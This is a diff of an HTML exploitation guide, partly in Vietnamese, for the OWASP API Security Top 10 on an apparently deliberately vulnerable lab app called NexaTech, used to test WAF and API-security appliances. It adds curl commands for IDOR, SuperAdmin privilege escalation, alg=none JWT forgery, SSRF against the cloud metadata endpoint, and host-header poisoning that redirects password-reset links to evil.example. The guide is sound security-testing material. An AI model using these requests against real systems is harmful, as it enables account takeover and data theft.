@@ -25,8 +25,8 @@
 <body>
   <div class="wrap">
     <h1>OWASP API Security Top 10 — Hướng dẫn khai thác</h1>
-    <p class="lead">Public guide (không cần đăng nhập). Intentional vulnerabilities luôn bật trên NexaTech để PoC WAF / API Security appliance. Không có chế độ tắt lỗ hổng.</p>
-    <div class="warn"><strong>Cảnh báo:</strong> Chỉ dùng trên lab / môi trường PoC của bạn. Các lỗ hổng là thật và executable.</div>
+    <p class="lead">Public guide (không cần đăng nhập). Intentional vulnerabilities <strong>luôn bật</strong> (ADR-044) — không có toggle tắt lỗ hổng.</p>
+    <div class="warn"><strong>Cảnh báo:</strong> Chỉ dùng trên lab / môi trường PoC của bạn. Các lỗ hổng là thật và executable (~30+ API-mapped SC).</div>
 
     <div class="card toc">
       <strong>Mục lục API Top 10:2023</strong>
@@ -46,86 +46,119 @@
 
     <div class="card" id="api1">
       <h2><span class="tag">API1</span> BOLA / IDOR</h2>
-      <p>SC-01…SC-07, SC-36 — ownership luôn <code>allow</code>.</p>
+      <p>SC-01…SC-07, SC-36, SC-78, SC-79 — ownership / session IDOR luôn <code>allow</code>.</p>
       <pre>curl -s http://localhost:3007/api/v1/orders/OTHER_USER_ORDER_ID \
-  -H "x-user-id: attacker-id" -H "x-user-roles: Customer"</pre>
-      <p>Kỳ vọng: 200 + dữ liệu đơn người khác. Tương tự payment/shipping/review/warranty/support/media.</p>
+  -H "x-user-id: attacker-id" -H "x-user-roles: Customer"
+
+# SC-78 session IDOR
+curl -s http://localhost:3001/api/v1/auth/sessions/VICTIM_USER_ID \
+  -H "x-user-id: attacker"
+
+# SC-79 revoke any session
+curl -s -X DELETE http://localhost:3001/api/v1/auth/sessions/SESSION_ID \
+  -H "x-user-id: attacker"</pre>
     </div>
 
     <div class="card" id="api2">
       <h2><span class="tag">API2</span> Broken Authentication</h2>
-      <p>SC-21 no rate limit · SC-24 OTP <code>000000</code> · SC-70 alg=none probe.</p>
+      <p>SC-21 · SC-24 OTP <code>000000</code> · SC-70 alg=none · SC-75 PII · SC-80 exists · SC-84 query JWT · SC-86 GET login · SC-92 verify-bypass · SC-93 token Location.</p>
       <pre>curl -s -X POST http://localhost:3001/api/v1/auth/login \
   -H "content-type: application/json" \
   -d "{\"email\":\"victim@nexatech.local\",\"password\":\"wrong\"}"
-# brute-force: không bị RATE_LIMITED
 
-curl -s -X POST http://localhost:3001/api/v1/auth/verify-email \
+curl -s -X POST http://localhost:3001/api/v1/auth/forgot-password \
   -H "content-type: application/json" \
-  -d "{\"email\":\"victim@nexatech.local\",\"code\":\"000000\"}"
+  -d "{\"email\":\"nobody@evil.example\"}"
+# SC-80: exists:false
 
-# SC-70: forge alg=none JWT then call /auth/me (replace USER_ID)
 curl -s "http://localhost:3001/lab/jwt-alg-none?sub=USER_ID"
-# Use sampleUnsignedJwt from response:
-curl -s http://localhost:3001/api/v1/auth/me \
-  -H "Authorization: Bearer SAMPLE_UNSIGNED_JWT"</pre>
+curl -s "http://localhost:3001/api/v1/auth/me?access_token=SAMPLE_UNSIGNED_JWT"
+
+curl -s "http://localhost:3001/lab/login-get?email=USER&password=PASS"
+curl -s "http://localhost:3001/lab/verify-bypass?email=USER@nexatech.local"
+curl -sI "http://localhost:3001/lab/oauth-callback?token=leak&next=https://evil.example/cb"</pre>
     </div>
 
     <div class="card" id="api3">
       <h2><span class="tag">API3</span> Mass assignment / property level</h2>
-      <p>SC-10, SC-31 — PATCH admin users giữ <code>roles</code>; DTO leak <code>passwordHash</code>.</p>
-      <pre>curl -s http://localhost:3001/api/v1/admin/users \
-  -H "x-user-id: any" -H "x-user-roles: Customer"
-# BFLA + list users; response may include passwordHash
-
-curl -s -X PATCH http://localhost:3001/api/v1/admin/users/USER_ID \
+      <p>SC-10, SC-31, SC-85 weak password, SC-87 register roles, SC-95 export.</p>
+      <pre>curl -s -X PATCH http://localhost:3001/api/v1/admin/users/USER_ID \
   -H "content-type: application/json" \
   -H "x-user-id: any" -H "x-user-roles: Customer" \
-  -d "{\"roles\":[\"SuperAdmin\"],\"status\":\"ACTIVE\"}"</pre>
+  -d "{\"roles\":[\"SuperAdmin\"],\"status\":\"ACTIVE\"}"
+
+curl -s -X POST http://localhost:3001/api/v1/auth/register \
+  -H "content-type: application/json" \
+  -d "{\"email\":\"evil@x.com\",\"password\":\"Secret123\",\"fullName\":\"E\",\"roles\":[\"SuperAdmin\"]}"
+
+curl -s http://localhost:3001/api/v1/admin/users/export \
+  -H "x-user-id: any" -H "x-user-roles: Customer"</pre>
     </div>
 
     <div class="card" id="api4">
       <h2><span class="tag">API4</span> Resource consumption</h2>
-      <p>SC-21 login spam · SC-57 <code>pageSize=99999</code> trên admin users / lists.</p>
+      <p>SC-21 login spam · SC-57 <code>pageSize=99999</code>.</p>
       <pre>curl -s "http://localhost:3001/api/v1/admin/users?pageSize=99999" \
   -H "x-user-id: any" -H "x-user-roles: Customer"</pre>
     </div>
 
     <div class="card" id="api5">
       <h2><span class="tag">API5</span> BFLA</h2>
-      <p>SC-08 — Customer gọi mọi admin function. Dùng ví dụ admin users ở trên.</p>
+      <p>SC-08 · SC-76 create · SC-77 disable — Customer gọi admin users.</p>
+      <pre>curl -s -X POST http://localhost:3001/api/v1/admin/users \
+  -H "content-type: application/json" \
+  -H "x-user-id: any" -H "x-user-roles: Customer" \
+  -d "{\"email\":\"new@evil.example\",\"fullName\":\"X\",\"password\":\"1\",\"roles\":[\"Admin\"],\"status\":\"ACTIVE\"}"
+
+curl -s -X POST http://localhost:3001/api/v1/admin/users/USER_ID/disable \
+  -H "x-user-id: any" -H "x-user-roles: Customer"</pre>
     </div>
 
     <div class="card" id="api6">
       <h2><span class="tag">API6</span> Sensitive business flows</h2>
-      <p>SC-12 price trust · SC-16 idempotency · SC-17 replay · SC-20 amount · SC-58 checkout spam.</p>
-      <pre># VNPay callback với chữ ký sai / amount sai / replay vẫn được accept khi hit payment-service webhook
-# Create order nhiều lần — không quota</pre>
+      <p>SC-12 price · SC-16 idempotency · SC-17 replay · SC-20 amount · SC-58 checkout spam.</p>
+      <pre># VNPay / order paths — forged/replayed callbacks accepted (payment-service)</pre>
     </div>
 
     <div class="card" id="api7">
       <h2><span class="tag">API7</span> SSRF</h2>
-      <p>SC-59 — probe fetch thật (timeout 2.5s).</p>
+      <p>SC-59 — probe fetch thật.</p>
       <pre>curl -s "http://localhost:3001/lab/ssrf-probe?url=http://127.0.0.1:3001/health"
 curl -s "http://localhost:3001/lab/ssrf-probe?url=http://169.254.169.254/latest/meta-data/"</pre>
-      <p>Kỳ vọng: <code>fetched:true</code> hoặc bodyPreview / error từ target nội bộ.</p>
     </div>
 
     <div class="card" id="api8">
       <h2><span class="tag">API8</span> Misconfiguration</h2>
-      <p>SC-67 debug · SC-30 CORS reflect · SC-28 insecure cookies.</p>
+      <p>SC-67 debug · SC-30/89 CORS+credentials · SC-81 host poison · SC-82 Cache-Control · SC-83 reflect · SC-88 stack · SC-91 cookie · SC-94 MIME.</p>
       <pre>curl -s http://localhost:3001/health/debug
-curl -s "http://localhost:3001/health/debug?fail=1"</pre>
+curl -s "http://localhost:3001/health/debug?fail=1"
+curl -s -X POST http://localhost:3001/api/v1/auth/forgot-password \
+  -H "content-type: application/json" -H "x-forwarded-host: evil.example" \
+  -d "{\"email\":\"victim@nexatech.local\"}"
+# resetUrl host = evil.example
+
+curl -sI -X POST http://localhost:3001/api/v1/auth/login \
+  -H "content-type: application/json" \
+  -d "{\"email\":\"x@y.z\",\"password\":\"bad\"}"
+# Cache-Control: public
+
+curl -s http://localhost:3001/lab/reflect-headers -H "x-trace-id: evil%0aInjected"
+curl -s http://localhost:3001/lab/error-stack
+curl -sI http://localhost:3001/lab/set-cookie
+curl -s "http://localhost:3001/lab/content-type?type=image/svg%2Bxml"</pre>
     </div>
 
     <div class="card" id="api9">
       <h2><span class="tag">API9</span> Improper inventory</h2>
-      <pre>curl -s http://localhost:3001/api/v0/internal/routes</pre>
+      <p>SC-60 · SC-90</p>
+      <pre>curl -s http://localhost:3001/api/v0/internal/routes
+curl -s http://localhost:3001/lab/api-inventory
+curl -s http://localhost:3001/docs-json | head</pre>
     </div>
 
     <div class="card" id="api10">
       <h2><span class="tag">API10</span> Unsafe consumption of APIs</h2>
-      <p>SC-61 shipping webhook trust forged JSON · SC-62 supply-chain digest.</p>
+      <p>SC-61 shipping webhook · SC-62 supply-chain digest.</p>
       <pre>curl -s "http://localhost:3001/lab/supply-chain?digest=deadbeef"
 # accepted:true dù checksum sai</pre>
     </div>
@@ -133,7 +166,8 @@ curl -s "http://localhost:3001/health/debug?fail=1"</pre>
     <footer>
       Xem thêm: <a href="/lab/owasp-web-top10.html">OWASP Web Top 10 Guide</a> ·
       <a href="http://localhost:8000/docs">Swagger</a> ·
-      <a href="http://localhost:3100/security-lab">Admin lab console</a>
+      <a href="http://localhost:3100/security-lab">Admin lab console</a> ·
+      ADR-044 always-on (no dual-gate).
     </footer>
   </div>
 </body>
